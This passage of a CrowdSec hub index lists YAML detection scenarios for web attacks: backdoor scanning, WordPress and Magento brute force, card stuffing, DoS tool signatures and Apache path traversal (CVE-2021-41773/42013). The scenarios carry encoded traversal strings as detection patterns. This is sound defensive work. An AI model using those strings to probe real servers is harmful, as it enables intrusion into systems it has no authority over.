"302d872cdb0695b8471e681e9da268e77d6fd0a63dc521929ed103924f37dafe"}}}, "crowdsecurity/http-backdoors-attempts": {"content": "type: leaky\n#debug: true\nname: crowdsecurity/http-backdoors-attempts\ndescription: \"Detect attempt to common backdoors\"\nfilter: 'evt.Meta.log_type in [\"http_access-log\", \"http_error-log\"] and any(File(\"backdoors.txt\"), { evt.Parsed.file_name == #})'\ngroupby: \"evt.Meta.source_ip\"\ndistinct: evt.Parsed.file_name\ndata:\n  - source_url: https://hub-data.crowdsec.net/web/backdoors.txt\n    dest_file: backdoors.txt\n    type: string\ncapacity: 1\nleakspeed: 5s\nblackhole: 5m\nlabels:\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1595\n  behavior: \"http:exploit\"\n  label: \"Scanning for backdoors\"\n  service: http\n  remediation: true\n", "description": "Detect attempt to common backdoors", "path": "scenarios/crowdsecurity/http-backdoors-attempts.yaml", "version": "0.6", "versions": {"0.1": {"digest": "2eaba549ef284a36349482aa803b201fa8dcbff0f4d1ab2c5127d6b29806bba1"}, "0.2": {"digest": "388ec8c8f0679601bafa27fdf57fd414312bb2110bff56ef583bb505a1866d8b"}, "0.3": {"digest": "9eab7252dba254defcc9f90f38874df9f4f323d75aca0c831b9c9567edf9c00f"}, "0.4": {"digest": "45241f8074b19ce99d11fc082af5600f6c1833d748659361057947ebbac1a876"}, "0.5": {"digest": "c87e7add0110e5fb10e62db721ce931f57f5091f9f4fc885e0df8c36234ee53a"}, "0.6": {"digest": "dd5d8c02fff1fd939471358c61c9861387992f3062208a583839564bf644453b"}}}, "crowdsecurity/http-bad-user-agent": {"content": "type: leaky\nformat: 2.0\n#debug: true\nname: crowdsecurity/http-bad-user-agent\ndescription: \"Detect usage of bad User Agent\"\nfilter: 'evt.Meta.log_type in [\"http_access-log\", \"http_error-log\"] && RegexpInFile(evt.Parsed.http_user_agent, \"bad_user_agents.regex.txt\")'\ndata:\n  - source_url: https://hub-data.crowdsec.net/web/bad_user_agents.regex.txt\n    dest_file: bad_user_agents.regex.txt\n    type: regexp\n    strategy: LRU\n    size: 40\n    ttl: 10s\ncapacity: 1\nleakspeed: 1m\ngroupby: \"evt.Meta.source_ip\"\nblackhole: 2m\nlabels:\n  confidence: 1\n  spoofable: 0\n  classification:\n    - attack.T1595\n  behavior: \"http:scan\"\n  label: \"Bad User Agent\"\n  service: http\n  remediation: true\n", "description": "Detect usage of bad User Agent", "path": "scenarios/crowdsecurity/http-bad-user-agent.yaml", "version": "1.2", "versions": {"0.1": {"digest": "46e7058419bc3086f2919fb9afad6b2e85f0d4764f74153dd336ed491f99fa08"}, "0.2": {"digest": "524e2465c1bd817b4d54b37ccb4d2457eec1dad789e21690f51e43469545f426"}, "0.3": {"digest": "d3cae6c40fadd16693e449b4eb7a030586c8f1a9d9dd33c97001c9dc717c68f2"}, "0.4": {"digest": "8dd16e9de043f47f026d2e3c1b53ad4bbc6dd8f8aac3adaf26a7f4bd2bb6e6fd"}, "0.5": {"digest": "93af1e0f77f0ccc62fdb3bd783a777b091a55e21413fc9cb05ba141608f8942b"}, "0.6": {"digest": "df3408e39840a2f7d11977d555985f93bc49e4b23a7e84e0e63ebe040c1e512d"}, "0.7": {"digest": "51360ad64c9672e5d3ba9c1786e6fc380c8752871a977a5dddac0d08551aa66a"}, "0.8": {"digest": "38bc505811135db4788cb7a70199f43a7276f7828b86676fb8b4fc6da62a0adc"}, "0.9": {"digest": "6142a2394aaa38810c6d5c7258f8011bc4b39f7e2bf4cb6b6d557475bb377328"}, "1.0": {"digest": "9ad6df04b0516207b0d9df602047fcff02a24028352883be33abde7a603501e4"}, "1.1": {"digest": "c1b96206d623b9ce9a143b19f4245d3ebb4d971528ce4a09da8a415ab2d7b9b7"}, "1.2": {"digest": "7ca405d1147762b1f488bc0f13575c5af8081499c8a5c2971d706e8b03493671"}}}, "crowdsecurity/http-bf-wordpress_bf": {"content": "type: leaky\nname: crowdsecurity/http-bf-wordpress_bf\ndescription: \"Detect WordPress bruteforce on admin interface\"\ndebug: false\n# failed auth on wp-login.php returns 200\nfilter: \"evt.Meta.log_type == 'http_access-log' && evt.Parsed.file_name == 'wp-login.php' && evt.Parsed.verb == 'POST' && evt.Meta.http_status == '200'\"\ngroupby: evt.Meta.source_ip\ncapacity: 5\nleakspeed: 10s\nblackhole: 5m\nlabels:\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  behavior: \"http:bruteforce\"\n  label: \"WordPress Bruteforce\"\n  service: wordpress\n  remediation: true\n", "description": "Detect WordPress bruteforce on admin interface", "path": "scenarios/crowdsecurity/http-bf-wordpress_bf.yaml", "version": "0.7", "versions": {"0.1": {"digest": "628d9988c1f2448f4ffa5a72fe8aec6e1c1eedd8c838447630cce653bf31cbd9"}, "0.2": {"digest": "f4074942f2454ffeae226219e0807c63262413986a5b07fc939f4b0835e7bef2"}, "0.3": {"digest": "b313b926ef3c42c125526c707a761efd02d14f1f6ce577ef602709228427f482"}, "0.4": {"digest": "09f9a5e176da2971ddbdd07522fb64948500f867d78fc77167bcd494bce079a8"}, "0.5": {"digest": "9baa872c3b85a560952e57a77fd6fc49a5257a45c4296f89577ea6c490c0265f"}, "0.6": {"digest": "bf093ace6f82eadcd268a9aa4a8452a5fba699ef5397e0af3d3f1475634aa924"}, "0.7": {"digest": "dbdfb59bf06128765d7370d81b1e1153dab6900b5627cec35aaa67b6ebca7073"}}}, "crowdsecurity/http-bf-wordpress_bf_xmlrpc": {"content": "type: leaky\nname: crowdsecurity/http-bf-wordpress_bf_xmlrpc\ndescription: \"Detect WordPress bruteforce on XML-RPC endpoint\"\ndebug: false\n# XMLRPC always returns 200\nfilter: \"evt.Meta.log_type == 'http_access-log' && evt.Parsed.file_name == 'xmlrpc.php' && evt.Parsed.verb == 'POST'\"\ngroupby: evt.Meta.source_ip\ncapacity: 5\nleakspeed: 2m\nblackhole: 5m\nlabels:\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  behavior: \"http:bruteforce\"\n  label: \"WP XMLRPC bruteforce\"\n  service: wordpress\n  remediation: true\n", "description": "Detect WordPress bruteforce on XML-RPC endpoint", "path": "scenarios/crowdsecurity/http-bf-wordpress_bf_xmlrpc.yaml", "version": "0.3", "versions": {"0.1": {"digest": "d4a3456d8fc2edb27b895967f79053f649b943f043763369d437d5c55591c402"}, "0.2": {"digest": "c3da65b418bd36dc8e26aaf7c620f7629c60a65b34115525b9c93e6312d261b2"}, "0.3": {"digest": "4a7ba422a97b70dead7259ff98f733ae25d8130baed6c66835cef351bfd8fc7a"}}}, "crowdsecurity/http-crawl-non_statics": {"content": "type: leaky\nname: crowdsecurity/http-crawl-non_statics\ndescription: \"Detect aggressive crawl on non static resources\"\nfilter: \"evt.Meta.log_type in ['http_access-log', 'http_error-log'] && evt.Parsed.static_ressource == 'false' && evt.Parsed.verb in ['GET', 'HEAD']\"\ndistinct: \"evt.Parsed.file_name\"\nleakspeed: 0.5s\ncapacity: 40\n#debug: true\n#this limits the memory cache (and event_sequences in output) to five events\ncache_size: 5\ngroupby: \"evt.Meta.source_ip + '/' + evt.Parsed.target_fqdn\"\nblackhole: 1m\nlabels:\n  confidence: 1\n  spoofable: 0\n  classification:\n    - attack.T1595\n  behavior: \"http:crawl\"\n  service: http\n  label: \"Aggressive Crawl\"\n  remediation: true\n", "description": "Detect aggressive crawl on non static resources", "path": "scenarios/crowdsecurity/http-crawl-non_statics.yaml", "version": "0.7", "versions": {"0.1": {"digest": "86265749b84641e86e7e8ea3c1df53a1cabd1e0e04b6f93853db5d0687913cc7"}, "0.2": {"digest": "41fb957dfc8e2bb4ae76f2a64a5a25e169e5a0e7e53f42c432e84bec933657ca"}, "0.3": {"digest": "f0fa40870cdeea7b0da40b9f132e9c6de5e32d584334ec8a2d355faa35cde01c"}, "0.4": {"digest": "cd8f8a7a450855ad656b10758589c0d6fa38317ce001f3ae82dc29f0561f7145"}, "0.5": {"digest": "b7aefdcaae7ec28d61167aacafcc462b88b95317ca980976c435b9e5fde97fb0"}, "0.6": {"digest": "d37d938cc9d8f135c34c37126020ae8cf0f15ec15aee3e420ef4c74b4198a842"}, "0.7": {"digest": "9f235ae2116031a2b7a64da1e3ff5356b5f4fb91078de1c78bc30e0edb734dfb"}}}, "crowdsecurity/http-cve-2021-41773": {"content": "type: trigger\nformat: 2.0\n#debug: true\nname: crowdsecurity/http-cve-2021-41773\ndescription: \"Apache - Path Traversal (CVE-2021-41773)\"\nfilter: |\n  evt.Meta.log_type in [\"http_access-log\", \"http_error-log\"] and \n    (Upper(evt.Meta.http_path) contains \"/.%2E/.%2E/\"\n      or\n     Upper(evt.Meta.http_path) contains \"/%2E%2E/%2E%2E\")\ngroupby: \"evt.Meta.source_ip\"\nblackhole: 2m\nlabels:\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1190\n    - attack.T1595\n    - cve.CVE-2021-41773\n  behavior: \"http:exploit\"\n  label: \"CVE-2021-41773\"\n  service: apache\n  remediation: true\n", "description": "Apache - Path Traversal (CVE-2021-41773)", "path": "scenarios/crowdsecurity/http-cve-2021-41773.yaml", "version": "0.3", "versions": {"0.1": {"digest": "297eff27011c942a75937838e09c60c80f9dfdbfcb18b358b666777b4d1e89aa"}, "0.2": {"digest": "3cd742ad69889bee2644daf08c4eef1c14359fdf67e3642542d157e0c1bc0382"}, "0.3": {"digest": "f3fa755209fab221d6bbe04abd835c6539034cd72521725f960cdb36157e4313"}}}, "crowdsecurity/http-cve-2021-42013": {"content": "type: trigger\nformat: 2.0\n#debug: true\n#this is getting funny, it's the third patch on top of cve-2021-41773\nname: crowdsecurity/http-cve-2021-42013\ndescription: \"Apache - Path Traversal (CVE-2021-42013)\"\nfilter: |\n  evt.Meta.log_type in [\"http_access-log\", \"http_error-log\"] and \n    Upper(evt.Meta.http_path) contains \"/%%32%65%%32%65/\"\ngroupby: \"evt.Meta.source_ip\"\nblackhole: 2m\nlabels:\n  service: apache\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1190\n    - attack.T1595\n    - cve.CVE-2021-42013\n  behavior: \"http:exploit\"\n  label: \"CVE-2021-42013\"\n  remediation: true\n", "description": "Apache - Path Traversal (CVE-2021-42013)", "path": "scenarios/crowdsecurity/http-cve-2021-42013.yaml", "version": "0.3", "versions": {"0.1": {"digest": "5f7e21b44bc4284dde1cde1610109a06a0c986777f48c2f00e08db9e2f156459"}, "0.2": {"digest": "0ed92efba1d5146795df08340c91535aee56e9a0e2d650c2496f46ecb977314f"}, "0.3": {"digest": "b9e598a8e063f525a16ba78488787da5d409141c3a8b2665263654d92745e59a"}}}, "crowdsecurity/http-cve-probing": {"content": "type: trigger\nname: crowdsecurity/http-cve-probing\ndescription: \"Detect generic HTTP cve probing\"\nfilter: |\n  evt.Meta.service == 'http' and \n  evt.Meta.log_type in ['http_access-log', 'http_error-log'] and \n  evt.Meta.http_status in ['404', '403'] and\n  any(File(\"trendy_cves_uris.json\"), { \n    evt.Meta.http_path contains JsonExtract(#, \"uri\") ? evt.SetMeta(\"cve\", JsonExtract(#, \"cve\")) : false \n  })\ngroupby: evt.Meta.source_ip\ndistinct: \"evt.Meta.http_path\"\ndata:\n  # \n  - source_url: https://hub-data.crowdsec.net/web/trendy_cves_uris.json\n    dest_file: trendy_cves_uris.json\n    type: string\nblackhole: 1m\nlabels:\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1595\n  behavior: \"http:scan\"\n  label: \"HTTP CVE Probing\"\n  service: http\n  remediation: true\n", "description": "Detect generic HTTP cve probing", "path": "scenarios/crowdsecurity/http-cve-probing.yaml", "version": "0.6", "versions": {"0.1": {"digest": "f15efbad1d2d84d4c4f65e00a8729b57c98ac7a9f88a80e102bb15eba13171a8"}, "0.2": {"digest": "b3c888c3c0d039f0732b4545fa7b50009af12a7d2ff514c4aed8650d246feb81"}, "0.3": {"digest": "1e2e2774f69aa41fd77cf522a8b91fa93b004393bb79429204e7fa7fb20cf9f5"}, "0.4": {"digest": "4980a58007bc5adf6dcd42d1690198a4a05d41928625e221237c1b297886acf8"}, "0.5": {"digest": "057731f9bf9e39531186da723999e7c8972ea4d18ecae57f73ca1d6359cf0ace"}, "0.6": {"digest": "7ea1dded7513257d6a786b97efdebba1b1def3dec05aa02fc57cdc81e46a22d3"}}}, "crowdsecurity/http-dos-bypass-cache": {"content": "type: leaky\nname: crowdsecurity/http-dos-bypass-cache\ndescription: \"Detect DoS tools bypassing cache every request\"\n#as seen in cc-attack tool\nfilter: \"evt.Meta.log_type == 'http_access-log' && evt.Meta.http_args_len != '' && int(evt.Meta.http_args_len) >= 7 && int(evt.Meta.http_args_len) <= 12 && evt.Parsed.http_args matches '^[0-9]+$' && evt.Parsed.static_ressource == 'false'\"\ndistinct: \"evt.Parsed.http_args\"\nleakspeed: 1s\ncapacity: 30\n#debug: true\ncache_size: 10\ngroupby: \"evt.Meta.source_ip\"\nblackhole: 1m\nlabels:\n  service: http\n  remediation: true\n  confidence: 2\n  spoofable: 0\n  classification:\n    - attack.T1498\n  behavior: \"http:dos\"\n  label: \"HTTP DOS with cache bypass\"\n", "description": "Detect DoS tools bypassing cache every request", "path": "scenarios/crowdsecurity/http-dos-bypass-cache.yaml", "version": "0.5", "versions": {"0.1": {"digest": "0e58abde23b14beae6be2ca1b2bfe58ad980f75c5691b8c0cacf1b2fff4d23bd"}, "0.2": {"digest": "05d3d10236ceb9b23f3f9355970f9b25583c891e0d0d3cf210dc289240b48f25"}, "0.3": {"digest": "de4c4f23847193f3ee277ed1836b774773517a4fc41e64a91d2af40dcc611ac2"}, "0.4": {"digest": "beffaa2a1921fa3ab29122b0bf55a4b648b814771e9e6c5779736fd5f677375d"}, "0.5": {"digest": "fa8e2326d2d4f3b82d69a04c88a741b7f44dff7756ed2133ee4bfeb0db5d48a5"}}}, "crowdsecurity/http-dos-invalid-http-versions": {"content": "type: trigger\nformat: 2.0\n#debug: true\nname: crowdsecurity/http-dos-invalid-http-versions\ndescription: \"Detect DoS tools using invalid HTTP versions\"\n#pattern seen in mhddos tool\nfilter: 'evt.Meta.log_type in [\"http_access-log\", \"http_error-log\"] && evt.Parsed.http_version != \"\" && evt.Parsed.http_version not in [\"0.9\", \"1.0\", \"1.1\", \"2.0\", \"3.0\"]' \ngroupby: \"evt.Meta.source_ip\"\nblackhole: 2m\nlabels:\n  service: http\n  remediation: true\n  confidence: 2\n  spoofable: 0\n  classification:\n    - attack.T1498\n  behavior: \"http:dos\"\n  label: \"HTTP DOS with invalid HTTP version\"\n", "description": "Detect DoS tools using invalid HTTP versions", "path": "scenarios/crowdsecurity/http-dos-invalid-http-versions.yaml", "version": "0.7", "versions": {"0.1": {"digest": "4508b6364d19557247a86c08b6bd8c262295a661c01c183313c38aaeea08fd00"}, "0.2": {"digest": "7a0fe2257c1e04db49ac1f9c1a882553caa7b787168f574cc28a116e52974b14"}, "0.3": {"digest": "6ad1c79bf0ca97716b1176a9070a9eaf9e8356d0b5e3c1d7b4652cfa8acf8297"}, "0.4": {"digest": "2cb7ced10c6122aee759e1c0abec546c23a339337abae98292a9bd4752113887"}, "0.5": {"digest": "1224a0e02b5994241cba7b299e481dd8a74529826b0c561118aa0d7591bc8a07"}, "0.6": {"digest": "350ef964a77043809471f12b1a075f098d6879607f424c507185a9b5817e18e6"}, "0.7": {"digest": "71d9e3b461ae291274f594040a9d2c5abc414f86c9967ec4c7908224355969f8"}}}, "crowdsecurity/http-dos-random-uri": {"content": "type: leaky\nformat: 2.0\n#debug: true\nname: crowdsecurity/http-dos-random-uri\ndescription: \"Detect DoS tools using random uri\"\n#pattern seen in loic tool\nfilter: |\n  evt.Meta.log_type == \"http_access-log\" &&\n  evt.Meta.http_verb == 'GET' &&\n  evt.Parsed.static_ressource == 'false' &&\n  Upper(evt.Parsed.file_frag) == evt.Parsed.file_frag &&\n  len(evt.Parsed.file_frag) == 6 &&\n  int(evt.Meta.http_args_len) == 0\ncapacity: 30\nleakspeed: 1s\ngroupby: \"evt.Meta.source_ip\"\nblackhole: 2m\nlabels:\n  confidence: 2\n  spoofable: 0\n  classification:\n    - attack.T1498\n  behavior: \"http:dos\"\n  label: \"HTTP DOS via random URI\"\n  service: http\n  remediation: true\n", "description": "Detect DoS tools using random uri", "path": "scenarios/crowdsecurity/http-dos-random-uri.yaml", "version": "0.4", "versions": {"0.1": {"digest": "0fed8a75f88fd41f17498166bc1a60ec9e981ce1b82f0cd840ef52ae4fc71d39"}, "0.2": {"digest": "f1ed5aefe6fce34ce3253e85b342c3849620e7582e21ea03596121d540e2265b"}, "0.3": {"digest": "3dbd11fd32c3694ed82b4afe5509d5a4563853b864b0927385c8be6c200ac955"}, "0.4": {"digest": "5a07d325493252c48cac23f7b806d1a64eebdc2e34c111b7015ac45bae7e89fd"}}}, "crowdsecurity/http-dos-switching-ua": {"content": "type: leaky\nformat: 2.0\n#debug: true\nname: crowdsecurity/http-dos-swithcing-ua\ndescription: \"Detect DoS tools switching user-agent too fast\"\n#pattern seen in mhddos tool\nfilter: 'evt.Meta.log_type in [\"http_access-log\", \"http_error-log\"]'\ncapacity: 10\ndistinct: evt.Parsed.http_user_agent\nleakspeed: 8s\ngroupby: \"evt.Meta.source_ip\"\nblackhole: 2m\nlabels:\n  service: http\n  remediation: true\n  confidence: 2\n  spoofable: 0\n  classification:\n    - attack.T1498\n  behavior: \"http:dos\"\n  label: \"HTTP DOS with varying UA\"", "description": "Detect DoS tools switching user-agent too fast", "path": "scenarios/crowdsecurity/http-dos-switching-ua.yaml", "version": "0.5", "versions": {"0.1": {"digest": "3e0821e088a069ff12b26bfd106c913405b8cda87755438b535bbb803da6d5a1"}, "0.2": {"digest": "54b1bc5cade329a7b8dd8a4447258b8c0029732759dae3e2632e0f96abc04b36"}, "0.3": {"digest": "f40b2ff1b0a7351994ec48af5f5c31d66e4e475632e34e3e7c9218fb88b67cb6"}, "0.4": {"digest": "ce7739941426d9acc3c9d59a6bbf584202c680ce8e09204578a1914136b60fff"}, "0.5": {"digest": "84a9eb62f0cc1231999dba03a3832b7b828b514736e2a3d1dac5ac0b81c6aa7b"}}}, "crowdsecurity/http-generic-bf": {"content": "# 404 scan\ntype: leaky\n#debug: true\nname: crowdsecurity/http-generic-bf\ndescription: \"Detect generic http brute force\"\nfilter: \"evt.Meta.service == 'http' && evt.Meta.sub_type == 'auth_fail'\"\ngroupby: evt.Meta.source_ip\ncapacity: 5\nleakspeed: \"10s\"\nblackhole: 1m\nlabels:\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  behavior: \"http:bruteforce\"\n  label: \"HTTP Bruteforce\"\n  service: http\n  remediation: true\n---\n# Generic 401 Authorization Errors\ntype: leaky\n#debug: true\nname: LePresidente/http-generic-401-bf\ndescription: \"Detect generic 401 Authorization error brute force\"\nfilter: \"evt.Meta.log_type == 'http_access-log' && evt.Parsed.verb == 'POST' && evt.Meta.http_status == '401'\"\ngroupby: evt.Meta.source_ip\ncapacity: 5\nleakspeed: \"10s\"\nblackhole: 1m\nlabels:\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  behavior: \"http:bruteforce\"\n  label: \"HTTP Bruteforce\"\n  service: http\n  remediation: true\n---\n# Generic 403 Forbidden (Authorization) Errors\ntype: leaky\n#debug: true\nname: LePresidente/http-generic-403-bf\ndescription: \"Detect generic 403 Forbidden (Authorization) error brute force\"\nfilter: \"evt.Meta.log_type == 'http_access-log' && evt.Parsed.verb == 'POST' && evt.Meta.http_status == '403'\"\ngroupby: evt.Meta.source_ip\ncapacity: 5\nleakspeed: \"10s\"\nblackhole: 1m\nlabels:\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  behavior: \"http:bruteforce\"\n  label: \"HTTP Bruteforce\"\n  service: http\n  remediation: true\n", "description": "Detect generic http brute force", "path": "scenarios/crowdsecurity/http-generic-bf.yaml", "version": "0.9", "versions": {"0.1": {"digest": "aaaf0209fe77be79d8d61a50e73e5da6807e8f13eb7d9832e705553770f6d376"}, "0.2": {"digest": "ea9e2e43794d162a6bb6a560b940b7a2c73e55436de6555a96ac2edfadbe5d8d"}, "0.3": {"digest": "d43fbbc7da0a3427bcb170669b873035defedb470b79125e884e283901e57d2f"}, "0.4": {"digest": "be339072fbbe0691926e92678c48edd17141fc0f17ac14fd8b08f6a4e4f72748"}, "0.5": {"digest": "d03fa7fbb3179407f221bc4e11d177422d21e5adcdcf408edf5f8b0ef492741f"}, "0.6": {"digest": "2154028ae52c65753b6d7391cfb726041818fd0d443628598ac83f6e3732be53"}, "0.7": {"digest": "8f41d98915ac5021d900e8f5b6287d7b9adb16da27b2795d0fc3266790d9f079"}, "0.8": {"digest": "bd004afa5d7328432731ce3fdf52581b813600431c7ea7fd5a87cb9eca6e9985"}, "0.9": {"digest": "2154028ae52c65753b6d7391cfb726041818fd0d443628598ac83f6e3732be53"}}}, "crowdsecurity/http-generic-test": {"content": "# EICAR style scenario\n# This scenario is used to test CrowdSec installation and configuration and doesn't generate any decisions.\ntype: trigger\nname: crowdsecurity/http-generic-test\ndescription: \"Crowdsec Generic Test Scenario: basic HTTP trigger\"\nfilter: evt.Meta.log_type in [\"http_access-log\", \"http_error-log\"] and\n  evt.Meta.http_path == \"/crowdsec-test-NtktlJHV4TfBSK3wvlhiOBnl\"\nblackhole: 5m\ngroupby: \"evt.Meta.source_ip\"\nlabels:\n  confidence: 0\n  spoofable: 3\n  behavior: \"http:test\"\n  label: \"CrowdSec Generic Test Scenario\"\n  service: http\n  remediation: false\n", "description": "Crowdsec Generic Test Scenario: basic HTTP trigger", "path": "scenarios/crowdsecurity/http-generic-test.yaml", "version": "0.2", "versions": {"0.1": {"digest": "a7bf94dc8e211249b1b58d3bf825308ab22084c31351436cd3b3b8c6593b394d"}, "0.2": {"digest": "cce83c94aff8617409be261de09e9565154a7325e03b21bbc2a35d0b505289b6"}}}, "crowdsecurity/http-magento-bf": {"content": "type: leaky\nname: crowdsecurity/http-magento-bf\ndebug: false\ndescription: \"Detect bruteforce on Magento admin interface\"\nfilter: \"evt.Meta.log_type == 'ADMIN_LOGIN_FAILED'\"\ngroupby: evt.Meta.source_ip\ncapacity: 5\nleakspeed: 10s\nblackhole: 5m\nlabels:\n  service: magento\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  behavior: \"http:bruteforce\"\n  label: \"Magento Bruteforce\"\n  remediation: true\n", "description": "Detect bruteforce on Magento admin interface", "path": "scenarios/crowdsecurity/http-magento-bf.yaml", "version": "0.5", "versions": {"0.1": {"digest": "a77e4cb9a813ac8bad557138f3b20abaa67d8210768fcb350fb3efcc58c1dfc1"}, "0.2": {"digest": "98091fa975da7753f9b52ae6e028f9fef0dc46cb93575533a5a04ba824cda8f0"}, "0.3": {"digest": "e70c86f1a22879247fb6085ca2e6949a3163f92fd33c803ce7f89f0586324a00"}, "0.4": {"digest": "54d2aacd11db557b3a49a99a320e8894050dc6fbc004f5a28207b6ddfb4afa0e"}, "0.5": {"digest": "b20922d5eb39f7a7f93a3e55721da80cd48e8a0a074d182ca62c459f78e6f171"}}}, "crowdsecurity/http-magento-ccs": {"content": "type: leaky\nname: crowdsecurity/http-magento-ccs\ndebug: false\ndescription: \"Detect credit card stuffing from a single IP\"\nfilter: \"evt.Meta.log_type == 'PAYMENT_FAILED'\"\ngroupby: evt.Meta.source_ip\ncapacity: 3\nleakspeed: 30s\nblackhole: 5m\nlabels:\n  remediation: true\n  classification:\n    - attack.T1110.004\n  confidence: 2\n  spoofable: 0\n  service: magento\n  behavior: \"ecommerce:fraud\"\n  label: \"Magento Credit Card Stuffing\"\n", "description": "Detect credit card stuffing from a single IP", "path": "scenarios/crowdsecurity/http-magento-ccs.yaml", "version": "0.3", "versions": {"0.1": {"digest": "bf2bc42b888e36b62144129dd2d61e7b1aac6a4d1926c3ebbfe8453d15c3f6f3"}, "0.2": {"digest": "07dc5f21d5c4bcf6863c3ce57c4490a8a74c13d2c11ff32e73e419b768478468"}, "0.3": {"digest": "a390e04333ce744c7f3cb00ac3d7e72333c40f4f1407c87116244fc0a2a0ca86"}}}, "crowdsecurity/http-magento-ccs-by-as": {"content": "type: leaky\nname: crowdsecurity/http-magento-ccs-by-as\ndebug: false\ndescription: \"Detect distributed credit card stuffing from same AS\"\nfilter: \"evt.Meta.log_type == 'PAYMENT_FAILED' and evt.Meta.ASNNumber != '' \"\ngroupby: evt.Meta.ASNNumber\ndistinct: evt.Meta.source_ip\ncapacity: 10\nleakspeed: 30s\nblackhole: 5m\nlabels:\n  remediation: true\n  classification:\n    - attack.T1110.004\n  confidence: 1\n  spoofable: 3\n  service: magento\n  behavior: \"ecommerce:fraud\"\n  label: \"Magento Credit Card Stuffing By AS\"\n", "description": "Detect distributed credit card stuffing from same AS", "path": "scenarios/crowdsecurity/http-magento-ccs-by-as.yaml", "version": "0.3", "versions": {"0.1": {"digest": "6e585961ae092036eb9a506c311d331c3cbd59eccdf642cae86b424c39ad730a"}, "0.2": {"digest": "f65c1ddfabf04040ce288ff53a5d63db45e0db5995d43c86bd868243e3d3c099"}, "0.3": {"digest": "e77332ad52bff93a640417fa59b9762979421828ac32484df886af68208dc335"}}}, "crowdsecurity/http-magento-ccs-by-country": {"content": "type: leaky\nname: crowdsecurity/http-magento-ccs-by-country\ndebug: false\ndescription: \"Detect distributed credit card stuffing from same country\"\nfilter: \"evt.Meta.log_type == 'PAYMENT_FAILED' and evt.Meta.IsoCode != '' \"\ngroupby: evt.Meta.IsoCode\ndistinct: evt.Meta.source_ip\ncapacity: 10\nleakspeed: 30s\nblackhole: 5m\nlabels:\n  remediation: true\n  classification:\n    - attack.T1110.004\n  confidence: 1\n  spoofable: 3\n  service: magento\n  behavior: \"ecommerce:fraud\"\n  label: \"Magento Credit Card Stuffing By Country\"\n", "description": "Detect distributed credit card stuffing from same country", "path": "scenarios/crowdsecurity/http-magento-ccs-by-country.yaml", "version": "0.3", "versions": {"0.1": {"digest": "be8ae3f56024ef1be29104fa72a84e0178b2330f2e873b170cef782b1d3d6bc0"}, "0.2": {"digest": "fa29d5fb5f1f420753717485319e5c85fe39c977b5525ccc895a7b24f15a598c"}, "0.3": {"digest": "f4ff753638b54a01a2f455acc045e6229f62c6ce5d5751c8d1815b62f3161521"}}}, "crowdsecurity/http-open-proxy": {"content": "type: trigger\nname: crowdsecurity/http-open-proxy\ndescription: \"Detect scan for open proxy\"\n#apache returns 405, nginx 400\nfilter: \"evt.Meta.log_type == 'http_access-log' && evt.Meta.http_status in ['400','405'] && (evt.Parsed.verb == 'CONNECT' || evt.Parsed.request matches '^http[s]?://')\"\nblackhole: 2m\ngroupby: evt.Meta.source_ip\nlabels:\n  service: http\n  type: scan\n  remediation: true\n  classification:\n    - attack.T1595\n  behavior: \"http:scan\"\n  label: \"HTTP Open Proxy Probing\"\n  spoofable: 0\n  confidence: 3\n", "description": "Detect scan for open proxy", "path": "scenarios/crowdsecurity/http-open-proxy.yaml", "version": "0.5", "versions": {"0.1": {"digest": "994b9d17d915f47f4ee5f10b2d8b9b7c72b5c93e64f75f3dc1313bf3b5c2613f"}, "0.2": {"digest": "1c3b55ed813bbac8f8c0d9067d0ae3b7d6fe6b1d437d57ac4c3288c1f38b5ea2"}, "0.3": {"digest": "e6629c2cdb8f06a1f10561079d926ae42b8d90f680541bb30355714675f0412a"}, "0.4": {"digest": "5f808fac4a5cfe22723d2b588b23a72cb523796f689c9f53582ed41e0b7cbb45"}, "0.5": {"digest": "63b8b494f9d7be6134c7e19c0c7b0a95d35b87548ae0ccfbc5abb0a44034b5d7"}}}, "crowdsecurity/http-path-traversal-probing": {"content": "# path traversal probing\ntype: leaky\n#debug: true\nname: crowdsecurity/http-path-traversal-probing\ndescription: \"Detect path traversal attempt\"\nfilter: \"evt.Meta.log_type in ['http_access-log', 'http_error-log'] && any(File('http_path_traversal.txt'),{evt.Meta.http_path contains #})\"\ndata:\n  - source_url: https://hub-data.crowdsec.net/web/path_traversal.txt\n    dest_file: http_path_traversal.txt\n    type: string\ngroupby: \"evt.Meta.source_ip\"\ndistinct: \"evt.Meta.http_path\"\ncapacity: 3\nreprocess: true\nleakspeed: 10s\nblackhole: 2m\nlabels:\n  remediation: true\n  classification:\n    - attack.T1595.002\n  behavior: \"http:exploit\"\n  label: \"HTTP Path Traversal Exploit\"\n  service: http\n  spoofable: 0\n  confidence: 3\n", "description": "Detect path traversal attempt", "path": "scenarios/crowdsecurity/http-path-traversal-probing.yaml", "version": "0.4", "versions": {"0.1": {"digest": "3f00b0aa00448549a0a9635fdd86d8135503078c7087c1f5e4af11d49e7c2ee1"}, "0.2": {"digest": "b02022230086b96c212913406376584cc431332bb5cd26078dffa44ff9454499"}, "0.3": {"digest": "ae515cb83575c4f1e82ed1011d3b2ea9f9c86077fa6f59f28aa5d235b481adbe"}, "0.4": {"digest": "9d1b1e29018434aff77cec852ce7d0444e37b893995bd9bf46e7595f53ac5e6a"}}}, "crowdsecurity/http-probing": {"content": "# 404 scan\ntype: leaky\n#debug: true\nname: crowdsecurity/http-probing\ndescription: \"Detect site scanning/probing from a single ip\"\nfilter: \"evt.Meta.service == 'http' && evt.Meta.http_status in ['404', '403', '400'] && evt.Parsed.static_ressource == 'false'\"\ngroupby: \"evt.Meta.source_ip + '/' + evt.Parsed.target_fqdn\"\ndistinct: \"evt.Meta.http_path\"\ncapacity: 10\nreprocess: true\nleakspeed: \"10s\"\nblackhole: 5m\nlabels:\n  remediation: true\n  classification:\n    - attack.T1595\n  behavior: \"http:scan\"\n  label: \"HTTP Probing\"\n  spoofable: 0\n  service: http\n  confidence: 1\n", "description": "Detect site scanning/probing from a single ip", "path": 